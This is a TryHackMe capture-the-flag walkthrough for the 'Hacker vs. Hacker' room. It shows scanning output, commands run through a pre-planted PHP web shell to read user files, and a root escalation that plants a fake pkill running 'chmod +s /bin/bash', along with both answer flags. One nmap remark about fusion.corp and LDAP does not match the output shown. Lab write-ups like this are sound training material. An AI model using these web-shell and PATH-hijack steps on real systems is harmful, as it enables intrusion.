<p align="center">May 2, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{361}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/1b4099ab-6c57-48a2-a915-7ae52b5e1836" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/1acd3213-b0f0-4ec2-a142-8e36ab0df272"><br></p>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Hacker vs. Hacker}}$$</h1>
<p align="center">Someone has compromised this server already! Can you get in and evade their countermeasures?<br>
It is classified an easy-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/hackervshacker">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/1600eb32-720f-4fde-80b1-71702d92d662"> </p>


<br>


<h2>Task 1 . Get on and boot them out!</h2>

<p>The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?</p>



<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What is the user.txt flag?</em> Hint : <em>The hacker may have been a bit sloppy in their stealth measures...</em><br><a id='1.1'></a>
>> <strong><code>thm{af7e46b68081d4025c5ce10851430617}</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the proof.txt flag?</em> Hint : <em>...and a bit sloppy in their automated kill scripts.</em><br><a id='1.2'></a>
>> <strong><code>thm{7b708e5224f666d3562647816ee2a1d4}</code></strong><br>
<p></p>

<br>
<br>

<h3 align="center">nmap</h3>

<p>- Identified domain name <code>fusion.corp</code>. There is also LDAP in port  <code>3268</code>.</p>

```bash
:~/Hacker.vs.Hacker# nmap -sC -sV -n -Pn -p- -T4 TargetIP...
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
...
:~/Hacker.vs.Hacker#
```

<br>

<br>

<h3 align="center">dirb</h3>

```bash
:~/Hacker.vs.Hacker# dirb http://TargetIP /usr/share/wordlists/dirb/common.txt
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP/ ----
==> DIRECTORY: http://TargetIP/css/                                                                                                  
==> DIRECTORY: http://TargetIP/cvs/                                                                                                  
==> DIRECTORY: http://TargetIP/dist/                                                                                                 
==> DIRECTORY: http://TargetIP/images/                                                                                               
+ http://TargetIP/index.html (CODE:200|SIZE:3413)                                                                                    
+ http://TargetIP/server-status (CODE:403|SIZE:277)                                                                                  
                                                                                                                                         
---- Entering directory: http://TargetIP/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                         
---- Entering directory: http://TargetIP/cvs/ ----
+ http://10.10.46.123/cvs/index.html (CODE:200|SIZE:26)                                                                                  
                                                                                                                                         
---- Entering directory: http://TargetIP/dist/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                         
---- Entering directory: http://TargetIP/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
...
DOWNLOADED: 9224 - FOUND: 3
:~/Hacker.vs.Hacker# 
```

<br>

<h3 align="center">http://TargetIP</h3>


![image](https://github.com/user-attachments/assets/812067ad-74cb-4b8a-94d6-6d618469293b)

<br>

![image](https://github.com/user-attachments/assets/cbf9ce94-1745-48bf-a881-03e3cbee78d8)

<br>

<p>Viewed its page source.<br>
There is <code>XSS</code>.</p>

![image](https://github.com/user-attachments/assets/0505d935-212a-4c55-84ad-7113fba2ad78)

<p></p>


<p>Uploaded and image.  LoL<br><br>
Intercepted it through <code>Burp Suite</code>code></code></p>

<p>- Burp Suite captured <code>php</code> extension instead of the one of my image.<br>
- <code>.pdf</code> files are accepted.<br>
- It was mentioned a <code>shell</code></p>

![image](https://github.com/user-attachments/assets/ed63fd7c-e8f6-4c6b-9658-77a8cf016440)

<br>


<h3 align="center">fuff    |     enumerating web extensions in <code>/cvs</code></h3>


```bash
:~/Hacker.vs.Hacker# ffuf -u http://TargetIP/cvs/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://TargetIP/cvs/indexFUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.phps                   [Status: 403, Size: 277, Words: 20, Lines: 10]
.html                   [Status: 200, Size: 26, Words: 3, Lines: 1]
:: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
                                          
```

<br>

<h3 align="center">gobuster    |     enumerating the files which contains php extensiond</h3>

```bash

```


![image](https://github.com/user-attachments/assets/ba7ad885-2dad-4bd2-a6fd-3a4aef8bd519)


<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=whoami</h3>

![image](https://github.com/user-attachments/assets/eee2ab27-eb57-4803-9c38-7b4b2be25014)


<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=ls%20-la%20/home</h3>


![image](https://github.com/user-attachments/assets/01872c6e-599f-422f-9233-74096091e6ca)

<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan</h3>

![image](https://github.com/user-attachments/assets/0a34aff9-717a-4ca1-a133-c60c51dcc7cb)

<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt</h3>

![image](https://github.com/user-attachments/assets/166957ec-29b8-4e23-949f-2c54e974080c)

<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=pwd</h3>

![image](https://github.com/user-attachments/assets/9378b421-3373-4951-962f-f97b4ca52ed3)

<h3 align="center">http://TargetIP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan/.bash_history</h3>

![image](https://github.com/user-attachments/assets/14f64227-2567-4f4f-8c66-a159e23345f2)


<br>

<h3 align="center">ssh</h3>

```bash
:~/Hacker.vs.Hacker# ssh lachlan@TargetIP
...
$ id
uid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)
$ pwd
/home/lachlan
$ nope
Connection to TargetIP closed.

```


<h3 align="center">[http://TargetIP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan/.bash_history](http://10.10.46.123/cvs/shell.pdf.php?cmd=cat%20/etc/cron.d/persistence)</h3>

![image](https://github.com/user-attachments/assets/e37798e8-e9b4-4892-9d47-994d62882fe6)



```bash
:~/Hacker.vs.Hacker# ssh lachlan@TargetIP -T
...
pwd
/home/lachlan
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
lachlan@b2r:~$ nope
cd ..
ls
lachlan
cd ..
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
pwd
/
ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
cd /home
cd lachlan
cd bin
pwd
/home/lachlan/bin
echo -n "chmod +s /bin/bash" > pkill
chmod +x pkill
ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
/bin/bash -p
whoami
root
cat /root/root.txt
thm{7b708e5224f666d3562647816ee2a1d4}
```

<br>
<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/78a57721-62ea-4151-b667-55e1c3e948fb"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/3c4df0f4-fb0e-46b2-a10d-a862df124d56"></p>

<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

|       Date        |   Streak |   All Time   |   All Time   |   Monthly   |   Monthly  |  Points  |   Rooms   |   Badges  |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
|    May 2, 2025    |    361   |     240ᵗʰ    |      6ᵗʰ     |     597ᵗʰ   |     6ᵗʰ    |  99,283  |    704    |     60    |

</div>

<br>


<p align="center"> Global All Time: 240ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/cfca15c3-c7e7-4558-b7d9-2de4d06c0046"> </p>

<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/3ef56879-5983-4686-8bb8-27ea64d4a676"> </p>

<p align="center"> Global monthly:  597ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/a7925b93-33a6-4a6c-9997-117ec6d7873d"> </p>

<p align="center"> Brazil monthly:    6ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/4a9fccde-6a1f-409b-b002-61267a7ab870"> </p>

<br>
<br>


<p align="center"> Weekly League:    12ⁿᵈ Platinum<br><br><img width="1000px" src="https://github.com/user-attachments/assets/463d793c-5248-47c7-b7c2-12b772810797"> </p>

<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/Aquinas">Aquinas</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p>


